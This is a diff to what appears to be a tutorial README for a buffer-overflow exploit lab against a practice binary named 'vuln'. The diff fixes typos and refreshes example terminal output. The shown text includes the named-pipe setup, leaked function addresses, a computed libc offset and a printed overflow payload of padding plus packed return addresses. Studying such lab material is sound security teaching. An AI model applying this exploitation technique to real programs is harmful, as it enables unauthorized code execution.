@@ -92,7 +92,7 @@ Enter a string:
 
 
 ### Terminal Window 2
-Execute `cat > named_pipe`. This will keep the stdin open for `./vuln`, which is being execute in `exploit_run_vuln.sh`.
+Execute `cat > named_pipe`. This will keep the stdin open for `./vuln`, which is being executed in `exploit_run_vuln.sh`.
 
 ```
 $ cat > named_pipe 
@@ -121,26 +121,25 @@ $ ./generate_shellcode.py
 offset: -151616
 ```
 
-Now enter the `puts` address from terminal window 1.
+Now enter the `puts` address from **terminal window 1**.
 
 ```
  $ ./generate_shellcode.py                                                                               
  offset: -151616
- vuln_puts: 0xf0d40890
- vuln_func: 0xf0d1b850
- ```
+ vuln_puts: 0xea762890
+```
 
- **Notice that the `vulc_func` pointer was calcuated and printed**
+**Notice that the `vulc_func` pointer was calcuated and printed**
 
- Now enter the `useful_string` address from terminal window 1.
+Now enter the `useful_string` address from **terminal window 1**.
 
 ```
 $ ./generate_shellcode.py 
 offset: -151616
-vuln_puts: 0xf0d40890
-vuln_func: 0xf0d1b850
+vuln_puts: 0xea762890
+vuln_func: 0xea73d850
 useful_str: 0x5e2c1030
-b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP\xb8\xd1\xf0\x90\x08\xd4\xf00\x10,^\n\x00\x00\x00'
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP\xd8s\xea\x90(v\xea0\x10,^\n\x00\x00\x00'
 ```
 
 **Notice that the shellcode is printed (for debugging) and also written to the `named_pipe`**
